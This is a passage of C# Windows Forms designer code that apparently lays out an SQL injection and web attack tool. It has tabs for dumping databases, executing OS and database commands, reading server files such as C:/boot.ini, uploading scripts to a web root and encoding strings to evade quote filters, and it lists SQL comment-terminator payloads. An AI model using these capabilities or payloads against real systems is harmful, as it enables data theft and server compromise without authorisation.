            this.tabDatabase.UseVisualStyleBackColor = true;
            // 
            // splitDB
            // 
            this.splitDB.Dock = System.Windows.Forms.DockStyle.Fill;
            this.splitDB.Location = new System.Drawing.Point(3, 3);
            this.splitDB.Name = "splitDB";
            // 
            // splitDB.Panel1
            // 
            this.splitDB.Panel1.Controls.Add(this.treeViewDB);
            this.splitDB.Panel1.Controls.Add(this.toolStripDB);
            // 
            // splitDB.Panel2
            // 
            this.splitDB.Panel2.Controls.Add(this.listViewData);
            this.splitDB.Panel2.Controls.Add(this.toolStripData);
            this.splitDB.Size = new System.Drawing.Size(671, 360);
            this.splitDB.SplitterDistance = 341;
            this.splitDB.TabIndex = 0;
            // 
            // treeViewDB
            // 
            this.treeViewDB.CheckBoxes = true;
            this.treeViewDB.Dock = System.Windows.Forms.DockStyle.Fill;
            this.treeViewDB.Font = new System.Drawing.Font("Arial", 10.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.treeViewDB.FullRowSelect = true;
            this.treeViewDB.ImageIndex = 0;
            this.treeViewDB.ImageList = this.WCRImageList;
            this.treeViewDB.Indent = 40;
            this.treeViewDB.LabelEdit = true;
            this.treeViewDB.Location = new System.Drawing.Point(0, 0);
            this.treeViewDB.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.treeViewDB.Name = "treeViewDB";
            this.treeViewDB.SelectedImageIndex = 0;
            this.treeViewDB.Size = new System.Drawing.Size(341, 335);
            this.treeViewDB.TabIndex = 2;
            this.treeViewDB.BeforeCheck += new System.Windows.Forms.TreeViewCancelEventHandler(this.treeViewDB_BeforeCheck);
            this.treeViewDB.AfterCheck += new System.Windows.Forms.TreeViewEventHandler(this.treeViewDB_AfterCheck);
            this.treeViewDB.NodeMouseClick += new System.Windows.Forms.TreeNodeMouseClickEventHandler(this.treeViewDB_NodeMouseClick);
            this.treeViewDB.MouseDown += new System.Windows.Forms.MouseEventHandler(this.treeViewDB_MouseDown);
            // 
            // WCRImageList
            // 
            this.WCRImageList.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("WCRImageList.ImageStream")));
            this.WCRImageList.TransparentColor = System.Drawing.Color.Transparent;
            this.WCRImageList.Images.SetKeyName(0, "select.png");
            this.WCRImageList.Images.SetKeyName(1, "ie.png");
            this.WCRImageList.Images.SetKeyName(2, "scan.png");
            this.WCRImageList.Images.SetKeyName(3, "env.png");
            this.WCRImageList.Images.SetKeyName(4, "db.png");
            this.WCRImageList.Images.SetKeyName(5, "cmd.png");
            this.WCRImageList.Images.SetKeyName(6, "admin.png");
            this.WCRImageList.Images.SetKeyName(7, "file.png");
            this.WCRImageList.Images.SetKeyName(8, "xss.png");
            this.WCRImageList.Images.SetKeyName(9, "tool.png");
            this.WCRImageList.Images.SetKeyName(10, "code.png");
            this.WCRImageList.Images.SetKeyName(11, "about.png");
            this.WCRImageList.Images.SetKeyName(12, "go.png");
            this.WCRImageList.Images.SetKeyName(13, "start.png");
            this.WCRImageList.Images.SetKeyName(14, "pause.png");
            this.WCRImageList.Images.SetKeyName(15, "stop.png");
            this.WCRImageList.Images.SetKeyName(16, "table.png");
            this.WCRImageList.Images.SetKeyName(17, "column.png");
            this.WCRImageList.Images.SetKeyName(18, "vul.png");
            this.WCRImageList.Images.SetKeyName(19, "upload.png");
            this.WCRImageList.Images.SetKeyName(20, "report.png");
            this.WCRImageList.Images.SetKeyName(21, "escape.png");
            // 
            // toolStripDB
            // 
            this.toolStripDB.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.toolStripDB.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.toolStripDB.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolStripDB.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmbChkAllDB,
            this.toolStripSeparator8,
            this.btnGetDB,
            this.toolStripSeparator4,
            this.btnGetTable,
            this.toolStripSeparator5,
            this.btnGetColumn,
            this.toolStripSeparator6,
            this.btnImpDB,
            this.toolStripSeparator17,
            this.btnExpDB,
            this.toolStripSeparator19});
            this.toolStripDB.Location = new System.Drawing.Point(0, 335);
            this.toolStripDB.Name = "toolStripDB";
            this.toolStripDB.Size = new System.Drawing.Size(341, 25);
            this.toolStripDB.TabIndex = 0;
            this.toolStripDB.Text = "toolStrip1";
            // 
            // cmbChkAllDB
            // 
            this.cmbChkAllDB.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.cmbChkAllDB.Items.AddRange(new object[] {
            "Get_Current_DB_Only",
            "Get_All_DB"});
            this.cmbChkAllDB.Name = "cmbChkAllDB";
            this.cmbChkAllDB.Size = new System.Drawing.Size(130, 25);
            // 
            // toolStripSeparator8
            // 
            this.toolStripSeparator8.Name = "toolStripSeparator8";
            this.toolStripSeparator8.Size = new System.Drawing.Size(6, 25);
            // 
            // btnGetDB
            // 
            this.btnGetDB.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnGetDB.Image = ((System.Drawing.Image)(resources.GetObject("btnGetDB.Image")));
            this.btnGetDB.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnGetDB.Name = "btnGetDB";
            this.btnGetDB.Size = new System.Drawing.Size(67, 22);
            this.btnGetDB.Text = "DataBase";
            this.btnGetDB.Click += new System.EventHandler(this.btnGetDB_Click);
            // 
            // toolStripSeparator4
            // 
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new System.Drawing.Size(6, 25);
            // 
            // btnGetTable
            // 
            this.btnGetTable.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnGetTable.Image = ((System.Drawing.Image)(resources.GetObject("btnGetTable.Image")));
            this.btnGetTable.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnGetTable.Name = "btnGetTable";
            this.btnGetTable.Size = new System.Drawing.Size(44, 22);
            this.btnGetTable.Text = "Table";
            this.btnGetTable.Click += new System.EventHandler(this.btnGetTable_Click);
            // 
            // toolStripSeparator5
            // 
            this.toolStripSeparator5.Name = "toolStripSeparator5";
            this.toolStripSeparator5.Size = new System.Drawing.Size(6, 25);
            // 
            // btnGetColumn
            // 
            this.btnGetColumn.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnGetColumn.Image = ((System.Drawing.Image)(resources.GetObject("btnGetColumn.Image")));
            this.btnGetColumn.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnGetColumn.Name = "btnGetColumn";
            this.btnGetColumn.Size = new System.Drawing.Size(56, 22);
            this.btnGetColumn.Text = "Column";
            this.btnGetColumn.Click += new System.EventHandler(this.btnGetColumn_Click);
            // 
            // toolStripSeparator6
            // 
            this.toolStripSeparator6.Name = "toolStripSeparator6";
            this.toolStripSeparator6.Size = new System.Drawing.Size(6, 25);
            // 
            // btnImpDB
            // 
            this.btnImpDB.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnImpDB.Image = ((System.Drawing.Image)(resources.GetObject("btnImpDB.Image")));
            this.btnImpDB.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnImpDB.Name = "btnImpDB";
            this.btnImpDB.Size = new System.Drawing.Size(52, 21);
            this.btnImpDB.Text = "Import";
            this.btnImpDB.Click += new System.EventHandler(this.btnImpDB_Click);
            // 
            // toolStripSeparator17
            // 
            this.toolStripSeparator17.Name = "toolStripSeparator17";
            this.toolStripSeparator17.Size = new System.Drawing.Size(6, 25);
            // 
            // btnExpDB
            // 
            this.btnExpDB.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnExpDB.Image = ((System.Drawing.Image)(resources.GetObject("btnExpDB.Image")));
            this.btnExpDB.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnExpDB.Name = "btnExpDB";
            this.btnExpDB.Size = new System.Drawing.Size(50, 21);
            this.btnExpDB.Text = "Export";
            this.btnExpDB.Click += new System.EventHandler(this.btnExpDB_Click);
            // 
            // toolStripSeparator19
            // 
            this.toolStripSeparator19.Name = "toolStripSeparator19";
            this.toolStripSeparator19.Size = new System.Drawing.Size(6, 25);
            // 
            // listViewData
            // 
            this.listViewData.AllowColumnReorder = true;
            this.listViewData.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listViewData.FullRowSelect = true;
            this.listViewData.Location = new System.Drawing.Point(0, 0);
            this.listViewData.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.listViewData.Name = "listViewData";
            this.listViewData.Size = new System.Drawing.Size(326, 335);
            this.listViewData.TabIndex = 8;
            this.listViewData.UseCompatibleStateImageBehavior = false;
            this.listViewData.View = System.Windows.Forms.View.Details;
            this.listViewData.MouseClick += new System.Windows.Forms.MouseEventHandler(this.listViewData_MouseClick);
            // 
            // toolStripData
            // 
            this.toolStripData.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.toolStripData.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.toolStripData.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolStripData.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripLabel4,
            this.txtRowsBegin,
            this.toolStripLabel5,
            this.txtRowsEnd,
            this.toolStripSeparator7,
            this.btnGetData,
            this.toolStripSeparator9,
            this.btnExpData,
            this.toolStripSeparator18});
            this.toolStripData.Location = new System.Drawing.Point(0, 335);
            this.toolStripData.Name = "toolStripData";
            this.toolStripData.Size = new System.Drawing.Size(326, 25);
            this.toolStripData.TabIndex = 7;
            this.toolStripData.Text = "toolStrip1";
            // 
            // toolStripLabel4
            // 
            this.toolStripLabel4.Name = "toolStripLabel4";
            this.toolStripLabel4.Size = new System.Drawing.Size(73, 22);
            this.toolStripLabel4.Text = "Rows From";
            // 
            // txtRowsBegin
            // 
            this.txtRowsBegin.Name = "txtRowsBegin";
            this.txtRowsBegin.Size = new System.Drawing.Size(35, 25);
            this.txtRowsBegin.Text = "1";
            this.txtRowsBegin.ToolTipText = "Rows Begin( >=1)";
            // 
            // toolStripLabel5
            // 
            this.toolStripLabel5.Name = "toolStripLabel5";
            this.toolStripLabel5.Size = new System.Drawing.Size(23, 22);
            this.toolStripLabel5.Text = "To";
            // 
            // txtRowsEnd
            // 
            this.txtRowsEnd.Name = "txtRowsEnd";
            this.txtRowsEnd.Size = new System.Drawing.Size(35, 25);
            this.txtRowsEnd.Text = "2";
            this.txtRowsEnd.ToolTipText = "Rows End( >=1)";
            // 
            // toolStripSeparator7
            // 
            this.toolStripSeparator7.Name = "toolStripSeparator7";
            this.toolStripSeparator7.Size = new System.Drawing.Size(6, 25);
            // 
            // btnGetData
            // 
            this.btnGetData.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnGetData.Image = ((System.Drawing.Image)(resources.GetObject("btnGetData.Image")));
            this.btnGetData.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnGetData.Name = "btnGetData";
            this.btnGetData.Size = new System.Drawing.Size(39, 22);
            this.btnGetData.Text = "Data";
            this.btnGetData.Click += new System.EventHandler(this.btnGetData_Click);
            // 
            // toolStripSeparator9
            // 
            this.toolStripSeparator9.Name = "toolStripSeparator9";
            this.toolStripSeparator9.Size = new System.Drawing.Size(6, 25);
            // 
            // btnExpData
            // 
            this.btnExpData.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnExpData.Image = ((System.Drawing.Image)(resources.GetObject("btnExpData.Image")));
            this.btnExpData.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnExpData.Name = "btnExpData";
            this.btnExpData.Size = new System.Drawing.Size(50, 22);
            this.btnExpData.Text = "Export";
            this.btnExpData.Click += new System.EventHandler(this.btnExpData_Click);
            // 
            // toolStripSeparator18
            // 
            this.toolStripSeparator18.Name = "toolStripSeparator18";
            this.toolStripSeparator18.Size = new System.Drawing.Size(6, 25);
            // 
            // tabCMD
            // 
            this.tabCMD.Controls.Add(this.listBoxCMD);
            this.tabCMD.Controls.Add(this.toolStripDBCMD);
            this.tabCMD.Controls.Add(this.toolStripCommand);
            this.tabCMD.ImageKey = "cmd.png";
            this.tabCMD.Location = new System.Drawing.Point(4, 23);
            this.tabCMD.Name = "tabCMD";
            this.tabCMD.Size = new System.Drawing.Size(677, 366);
            this.tabCMD.TabIndex = 2;
            this.tabCMD.Text = "Command";
            this.tabCMD.UseVisualStyleBackColor = true;
            // 
            // listBoxCMD
            // 
            this.listBoxCMD.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listBoxCMD.FormattingEnabled = true;
            this.listBoxCMD.ItemHeight = 12;
            this.listBoxCMD.Location = new System.Drawing.Point(0, 25);
            this.listBoxCMD.Name = "listBoxCMD";
            this.listBoxCMD.Size = new System.Drawing.Size(677, 316);
            this.listBoxCMD.TabIndex = 8;
            // 
            // toolStripDBCMD
            // 
            this.toolStripDBCMD.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.toolStripDBCMD.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.toolStripDBCMD.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolStripDBCMD.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripSeparator15,
            this.txtDBCMD,
            this.btnDBCMD,
            this.toolStripSeparator16});
            this.toolStripDBCMD.Location = new System.Drawing.Point(0, 341);
            this.toolStripDBCMD.Name = "toolStripDBCMD";
            this.toolStripDBCMD.Size = new System.Drawing.Size(677, 25);
            this.toolStripDBCMD.TabIndex = 7;
            this.toolStripDBCMD.Text = "toolStrip1";
            // 
            // toolStripSeparator15
            // 
            this.toolStripSeparator15.Name = "toolStripSeparator15";
            this.toolStripSeparator15.Size = new System.Drawing.Size(6, 25);
            // 
            // txtDBCMD
            // 
            this.txtDBCMD.Name = "txtDBCMD";
            this.txtDBCMD.Size = new System.Drawing.Size(450, 25);
            this.txtDBCMD.Text = "select * from master..sysdatabases";
            // 
            // btnDBCMD
            // 
            this.btnDBCMD.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnDBCMD.Image = ((System.Drawing.Image)(resources.GetObject("btnDBCMD.Image")));
            this.btnDBCMD.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnDBCMD.Name = "btnDBCMD";
            this.btnDBCMD.Size = new System.Drawing.Size(62, 22);
            this.btnDBCMD.Text = "DB CMD";
            this.btnDBCMD.Click += new System.EventHandler(this.btnDBCMD_Click);
            // 
            // toolStripSeparator16
            // 
            this.toolStripSeparator16.Name = "toolStripSeparator16";
            this.toolStripSeparator16.Size = new System.Drawing.Size(6, 25);
            // 
            // toolStripCommand
            // 
            this.toolStripCommand.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.toolStripCommand.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolStripCommand.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripSeparator13,
            this.txtCMD,
            this.btnCMD,
            this.toolStripSeparator14});
            this.toolStripCommand.Location = new System.Drawing.Point(0, 0);
            this.toolStripCommand.Name = "toolStripCommand";
            this.toolStripCommand.Size = new System.Drawing.Size(677, 25);
            this.toolStripCommand.TabIndex = 6;
            this.toolStripCommand.Text = "toolStrip1";
            // 
            // toolStripSeparator13
            // 
            this.toolStripSeparator13.Name = "toolStripSeparator13";
            this.toolStripSeparator13.Size = new System.Drawing.Size(6, 25);
            // 
            // txtCMD
            // 
            this.txtCMD.Name = "txtCMD";
            this.txtCMD.Size = new System.Drawing.Size(450, 25);
            this.txtCMD.Text = "dir c:\\";
            // 
            // btnCMD
            // 
            this.btnCMD.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnCMD.Image = ((System.Drawing.Image)(resources.GetObject("btnCMD.Image")));
            this.btnCMD.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnCMD.Name = "btnCMD";
            this.btnCMD.Size = new System.Drawing.Size(56, 22);
            this.btnCMD.Text = "Execute";
            this.btnCMD.Click += new System.EventHandler(this.btnCMD_Click);
            // 
            // toolStripSeparator14
            // 
            this.toolStripSeparator14.Name = "toolStripSeparator14";
            this.toolStripSeparator14.Size = new System.Drawing.Size(6, 25);
            // 
            // tabFileReader
            // 
            this.tabFileReader.Controls.Add(this.txtFileContent);
            this.tabFileReader.Controls.Add(this.toolFileReader);
            this.tabFileReader.ImageKey = "file.png";
            this.tabFileReader.Location = new System.Drawing.Point(4, 23);
            this.tabFileReader.Name = "tabFileReader";
            this.tabFileReader.Size = new System.Drawing.Size(677, 366);
            this.tabFileReader.TabIndex = 3;
            this.tabFileReader.Text = "FileReader";
            this.tabFileReader.UseVisualStyleBackColor = true;
            // 
            // txtFileContent
            // 
            this.txtFileContent.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtFileContent.Location = new System.Drawing.Point(0, 25);
            this.txtFileContent.Multiline = true;
            this.txtFileContent.Name = "txtFileContent";
            this.txtFileContent.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.txtFileContent.Size = new System.Drawing.Size(677, 341);
            this.txtFileContent.TabIndex = 4;
            // 
            // toolFileReader
            // 
            this.toolFileReader.BackColor = System.Drawing.SystemColors.ButtonFace;
            this.toolFileReader.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
            this.toolFileReader.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripLabel6,
            this.txtFileName,
            this.btnReadFile,
            this.toolStripSeparator10});
            this.toolFileReader.Location = new System.Drawing.Point(0, 0);
            this.toolFileReader.Name = "toolFileReader";
            this.toolFileReader.Size = new System.Drawing.Size(677, 25);
            this.toolFileReader.TabIndex = 0;
            this.toolFileReader.Text = "ReadFile";
            // 
            // toolStripLabel6
            // 
            this.toolStripLabel6.Name = "toolStripLabel6";
            this.toolStripLabel6.Size = new System.Drawing.Size(114, 22);
            this.toolStripLabel6.Text = "FilePath/FileName:";
            // 
            // txtFileName
            // 
            this.txtFileName.Name = "txtFileName";
            this.txtFileName.Size = new System.Drawing.Size(280, 25);
            this.txtFileName.Text = "C:/boot.ini";
            // 
            // btnReadFile
            // 
            this.btnReadFile.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            this.btnReadFile.Image = ((System.Drawing.Image)(resources.GetObject("btnReadFile.Image")));
            this.btnReadFile.ImageTransparentColor = System.Drawing.Color.Magenta;
            this.btnReadFile.Name = "btnReadFile";
            this.btnReadFile.Size = new System.Drawing.Size(61, 22);
            this.btnReadFile.Text = "ReadFile";
            this.btnReadFile.Click += new System.EventHandler(this.btnReadFile_Click);
            // 
            // toolStripSeparator10
            // 
            this.toolStripSeparator10.Name = "toolStripSeparator10";
            this.toolStripSeparator10.Size = new System.Drawing.Size(6, 25);
            // 
            // tabFileUploader
            // 
            this.tabFileUploader.Controls.Add(this.btnGetWebRoot);
            this.tabFileUploader.Controls.Add(this.label3);
            this.tabFileUploader.Controls.Add(this.txtTargetFileName);
            this.tabFileUploader.Controls.Add(this.label2);
            this.tabFileUploader.Controls.Add(this.btnSelectFile);
            this.tabFileUploader.Controls.Add(this.btnFileUpload);
            this.tabFileUploader.Controls.Add(this.txtUploadFile);
            this.tabFileUploader.ImageKey = "upload.png";
            this.tabFileUploader.Location = new System.Drawing.Point(4, 23);
            this.tabFileUploader.Name = "tabFileUploader";
            this.tabFileUploader.Size = new System.Drawing.Size(677, 366);
            this.tabFileUploader.TabIndex = 5;
            this.tabFileUploader.Text = "FileUploader";
            this.tabFileUploader.UseVisualStyleBackColor = true;
            // 
            // btnGetWebRoot
            // 
            this.btnGetWebRoot.Location = new System.Drawing.Point(477, 72);
            this.btnGetWebRoot.Name = "btnGetWebRoot";
            this.btnGetWebRoot.Size = new System.Drawing.Size(91, 23);
            this.btnGetWebRoot.TabIndex = 6;
            this.btnGetWebRoot.Text = "Get Web Root";
            this.btnGetWebRoot.UseVisualStyleBackColor = true;
            this.btnGetWebRoot.Click += new System.EventHandler(this.btnGetWebRoot_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(10, 78);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(107, 12);
            this.label3.TabIndex = 5;
            this.label3.Text = "Target Path Name:";
            // 
            // txtTargetFileName
            // 
            this.txtTargetFileName.Location = new System.Drawing.Point(121, 73);
            this.txtTargetFileName.Name = "txtTargetFileName";
            this.txtTargetFileName.Size = new System.Drawing.Size(349, 21);
            this.txtTargetFileName.TabIndex = 4;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(8, 40);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(107, 12);
            this.label2.TabIndex = 3;
            this.label2.Text = "Text/Script File:";
            // 
            // btnSelectFile
            // 
            this.btnSelectFile.Location = new System.Drawing.Point(476, 35);
            this.btnSelectFile.Name = "btnSelectFile";
            this.btnSelectFile.Size = new System.Drawing.Size(92, 23);
            this.btnSelectFile.TabIndex = 2;
            this.btnSelectFile.Text = "...";
            this.btnSelectFile.UseVisualStyleBackColor = true;
            this.btnSelectFile.Click += new System.EventHandler(this.btnSelectFile_Click);
            // 
            // btnFileUpload
            // 
            this.btnFileUpload.Location = new System.Drawing.Point(8, 114);
            this.btnFileUpload.Name = "btnFileUpload";
            this.btnFileUpload.Size = new System.Drawing.Size(75, 23);
            this.btnFileUpload.TabIndex = 1;
            this.btnFileUpload.Text = "Upload";
            this.btnFileUpload.UseVisualStyleBackColor = true;
            this.btnFileUpload.Click += new System.EventHandler(this.btnFileUpload_Click);
            // 
            // txtUploadFile
            // 
            this.txtUploadFile.Location = new System.Drawing.Point(121, 36);
            this.txtUploadFile.Name = "txtUploadFile";
            this.txtUploadFile.Size = new System.Drawing.Size(349, 21);
            this.txtUploadFile.TabIndex = 0;
            // 
            // tabEscapeString
            // 
            this.tabEscapeString.Controls.Add(this.label17);
            this.tabEscapeString.Controls.Add(this.label16);
            this.tabEscapeString.Controls.Add(this.btnEncode);
            this.tabEscapeString.Controls.Add(this.txtEscapeString);
            this.tabEscapeString.Controls.Add(this.txtSourceString);
            this.tabEscapeString.Controls.Add(this.label6);
            this.tabEscapeString.Controls.Add(this.label5);
            this.tabEscapeString.ImageKey = "escape.png";
            this.tabEscapeString.Location = new System.Drawing.Point(4, 23);
            this.tabEscapeString.Name = "tabEscapeString";
            this.tabEscapeString.Size = new System.Drawing.Size(677, 366);
            this.tabEscapeString.TabIndex = 6;
            this.tabEscapeString.Text = "StringEncode";
            this.tabEscapeString.UseVisualStyleBackColor = true;
            // 
            // label17
            // 
            this.label17.AutoSize = true;
            this.label17.Location = new System.Drawing.Point(112, 102);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(359, 12);
            this.label17.TabIndex = 6;
            this.label17.Text = "Escape single/double quotes filter, used for SQL Injection.";
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.Location = new System.Drawing.Point(112, 45);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(353, 12);
            this.label16.TabIndex = 5;
            this.label16.Text = "Don\'t input the beginning and the end special char: \' or \"";
            // 
            // btnEncode
            // 
            this.btnEncode.Location = new System.Drawing.Point(114, 133);
            this.btnEncode.Name = "btnEncode";
            this.btnEncode.Size = new System.Drawing.Size(75, 23);
            this.btnEncode.TabIndex = 4;
            this.btnEncode.Text = "Encode";
            this.btnEncode.UseVisualStyleBackColor = true;
            this.btnEncode.Click += new System.EventHandler(this.btnEncode_Click);
            // 
            // txtEscapeString
            // 
            this.txtEscapeString.Location = new System.Drawing.Point(114, 78);
            this.txtEscapeString.Name = "txtEscapeString";
            this.txtEscapeString.Size = new System.Drawing.Size(507, 21);
            this.txtEscapeString.TabIndex = 3;
            // 
            // txtSourceString
            // 
            this.txtSourceString.Location = new System.Drawing.Point(114, 21);
            this.txtSourceString.Name = "txtSourceString";
            this.txtSourceString.Size = new System.Drawing.Size(507, 21);
            this.txtSourceString.TabIndex = 2;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(18, 82);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(89, 12);
            this.label6.TabIndex = 1;
            this.label6.Text = "String Encode:";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(18, 25);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(89, 12);
            this.label5.TabIndex = 0;
            this.label5.Text = "Source String:";
            // 
            // tabDebug
            // 
            this.tabDebug.Controls.Add(this.grpBlindType);
            this.tabDebug.ImageKey = "tool.png";
            this.tabDebug.Location = new System.Drawing.Point(4, 23);
            this.tabDebug.Name = "tabDebug";
            this.tabDebug.Size = new System.Drawing.Size(677, 366);
            this.tabDebug.TabIndex = 4;
            this.tabDebug.Text = "Debug";
            this.tabDebug.UseVisualStyleBackColor = true;
            // 
            // grpBlindType
            // 
            this.grpBlindType.Controls.Add(this.label20);
            this.grpBlindType.Controls.Add(this.label21);
            this.grpBlindType.Controls.Add(this.label22);
            this.grpBlindType.Controls.Add(this.ComboBoxWebEncoding);
            this.grpBlindType.Controls.Add(this.label19);
            this.grpBlindType.Controls.Add(this.ComboBoxDBEncoding);
            this.grpBlindType.Controls.Add(this.label18);
            this.grpBlindType.Controls.Add(this.txtComment);
            this.grpBlindType.Controls.Add(this.lblComment);
            this.grpBlindType.Controls.Add(this.label4);
            this.grpBlindType.Controls.Add(this.label1);
            this.grpBlindType.Controls.Add(this.radioCrossSite);
            this.grpBlindType.Controls.Add(this.label15);
            this.grpBlindType.Controls.Add(this.label14);
            this.grpBlindType.Controls.Add(this.label13);
            this.grpBlindType.Controls.Add(this.label12);
            this.grpBlindType.Controls.Add(this.label11);
            this.grpBlindType.Controls.Add(this.label10);
            this.grpBlindType.Controls.Add(this.txtWildField);
            this.grpBlindType.Controls.Add(this.label9);
            this.grpBlindType.Controls.Add(this.btnSetEnv);
            this.grpBlindType.Controls.Add(this.btnGetEnv);
            this.grpBlindType.Controls.Add(this.label8);
            this.grpBlindType.Controls.Add(this.txtInjectField);
            this.grpBlindType.Controls.Add(this.label7);
            this.grpBlindType.Controls.Add(this.txtFieldNum);
            this.grpBlindType.Controls.Add(this.radioBlind);
            this.grpBlindType.Controls.Add(this.radioFieldEcho);
            this.grpBlindType.Controls.Add(this.radioPlainText);
            this.grpBlindType.Location = new System.Drawing.Point(3, 13);
            this.grpBlindType.Name = "grpBlindType";
            this.grpBlindType.Size = new System.Drawing.Size(661, 344);
            this.grpBlindType.TabIndex = 1;
            this.grpBlindType.TabStop = false;
            this.grpBlindType.Text = "How to Get Data When SQL Injection (For Professional)";
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.Location = new System.Drawing.Point(239, 286);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(389, 12);
            this.label20.TabIndex = 29;
            this.label20.Text = "Example: UTF-8  UTF-16(Unicode)  iso-8859-1(Latin1)  gb2312 big5";
            // 
            // label21
            // 
            this.label21.AutoSize = true;
            this.label21.Location = new System.Drawing.Point(239, 260);
            this.label21.Name = "label21";
            this.label21.Size = new System.Drawing.Size(389, 12);
            this.label21.TabIndex = 28;
            this.label21.Text = "Example: UTF-8  UTF-16(Unicode)  iso-8859-1(Latin1)  gb2312 big5";
            // 
            // label22
            // 
            this.label22.AutoSize = true;
            this.label22.Location = new System.Drawing.Point(19, 260);
            this.label22.Name = "label22";
            this.label22.Size = new System.Drawing.Size(83, 12);
            this.label22.TabIndex = 27;
            this.label22.Text = "Web Encoding:";
            // 
            // ComboBoxWebEncoding
            // 
            this.ComboBoxWebEncoding.FormattingEnabled = true;
            this.ComboBoxWebEncoding.Items.AddRange(new object[] {
            "UTF-8",
            "UTF-16",
            "iso-8859-1",
            "gb2312",
            "big5"});
            this.ComboBoxWebEncoding.Location = new System.Drawing.Point(132, 256);
            this.ComboBoxWebEncoding.Name = "ComboBoxWebEncoding";
            this.ComboBoxWebEncoding.Size = new System.Drawing.Size(95, 20);
            this.ComboBoxWebEncoding.TabIndex = 26;
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.Location = new System.Drawing.Point(19, 286);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(113, 12);
            this.label19.TabIndex = 24;
            this.label19.Text = "Database Encoding:";
            // 
            // ComboBoxDBEncoding
            // 
            this.ComboBoxDBEncoding.FormattingEnabled = true;
            this.ComboBoxDBEncoding.Items.AddRange(new object[] {
            "UTF-8",
            "UTF-16",
            "iso-8859-1",
            "gb2312",
            "big5"});
            this.ComboBoxDBEncoding.Location = new System.Drawing.Point(132, 282);
            this.ComboBoxDBEncoding.Name = "ComboBoxDBEncoding";
            this.ComboBoxDBEncoding.Size = new System.Drawing.Size(95, 20);
            this.ComboBoxDBEncoding.TabIndex = 23;
            // 
            // label18
            // 
            this.label18.AutoSize = true;
            this.label18.Location = new System.Drawing.Point(239, 234);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(341, 12);
            this.label18.TabIndex = 22;
            this.label18.Text = "Example: --  %23  %2D%2D  %20%2D%2D  +--+   /*  %00  ;--";
            // 
            // txtComment
            // 
            this.txtComment.Location = new System.Drawing.Point(132, 230);
            this.txtComment.Name = "txtComment";
            this.txtComment.Size = new System.Drawing.Size(95, 21);
            this.txtComment.TabIndex = 21;
            // 
            // lblComment
            // 
            this.lblComment.AutoSize = true;
            this.lblComment.Location = new System.Drawing.Point(19, 234);
            this.lblComment.Name = "lblComment";
            this.lblComment.Size = new System.Drawing.Size(101, 12);
            this.lblComment.TabIndex = 20;
